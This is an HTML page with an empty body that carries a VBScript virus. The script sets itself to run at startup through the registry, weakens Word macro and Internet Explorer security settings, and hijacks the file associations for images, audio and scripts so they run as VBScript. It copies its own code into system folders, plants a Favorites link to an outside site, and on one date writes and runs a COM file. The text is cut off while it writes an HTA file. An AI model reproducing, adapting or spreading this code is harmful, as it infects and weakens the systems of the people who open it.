<html>
<body></body>
<script language=VBScript><!--
On Error Resume Next
Set WSH = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")
ISD = FSO.GetSpecialFolder(0)

WSH.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\FS", ISD & "\SYSTEM\FS.VBS"
WSH.RegWrite "HKCU\Software\Microsoft\Office\9.0\Word\Security\Level", 1, "REG_DWORD"
WSH.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "REG_DWORD"
WSH.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "REG_DWORD"
F2N = Array(".JS\", ".JSE\", ".GIF\", ".JPG\", ".MP3\", ".WSH\", ".WSF\", ".WSC\", ".SHS\", ".SCT\")
For F2NC = 0 To 10
WSH.RegWrite "HKEY_CLASSES_ROOT\" & F2N(F2NC), "VBSFile"
Next

If WSH.RegRead("HKLM\Software\Microsoft\FSV") = "" Then
FSH = Document.Body.CreateTextRange.HtmlText
If FSH = "" Then
Set FS = FSO.OpenTextFile(WScript.ScriptFullname, 1)
FSV = FS.ReadAll
FSH = Mid(FSV, 2, Len(FSV))
FSH = Mid(FSH, 1, Len(FSH) - 13)
FSH = FSH & "-->" & "<" & "/script>"
Else
FSV = "'" & Mid(FSH, 3, Len(FSH))
FSV = Mid(FSV, 1, Len(FSV) - 12)
FSV = FSV & "'-->" & "<" & "/script>"
End If
WSH.RegWrite "HKLM\Software\Microsoft\FSV", FSV
WSH.RegWrite "HKLM\Software\Microsoft\FSH", FSH
End If
FSH = WSH.RegRead("HKLM\Software\Microsoft\FSH")
FSV = WSH.RegRead("HKLM\Software\Microsoft\FSV")

Set EVA = WSH.CreateShortcut(ISD & ".\Favorites\Elva's Page.URL")
EVA.TargetPath = "http://www.jasonnet.cc/elva": EVA.Save

If Month(Now()) = 8 And Day(Now()) = 24 Then
Msgbox "-=Happy birthday=-" & Chr(13) & Chr(10) & "I love ELVA 4 ever"
Set FS = FSO.CreateTextFile(ISD & "\FS.COM", 2, 0)
FS.Write Chr(205) & Chr(32)
FS.Close
WSH.Run ISD & "\FS.COM"
End If

If FSO.GetFile(ISD & "\FS.VBE") = "" Then
Set FS = FSO.CreateTextFile(ISD & "\FS.VBE")
FS.WriteLine FSV: FS.Close
FSO.CopyFile ISD & "\FS.VBE", ISD & "\SYSTEM\FS.VBS", 1
End If

If FSO.GetFile(ISD & "\SYSTEM\CARD.HTA") = "" Then
Set FS = FSO.CreateTextFile(ISD & "\SYSTEM\CARD.HTA")
FS.WriteLine "<HTML>"&"<body bgcolor=""#000000"">"&"<div id='nap' style='position: absolute; text-align:center; top:60; left:0; font-size:40pt; font-family:Arial; font-weight:bold; color:#0066CC; FILTER:Light();'>"&"&nbsp;&nbsp;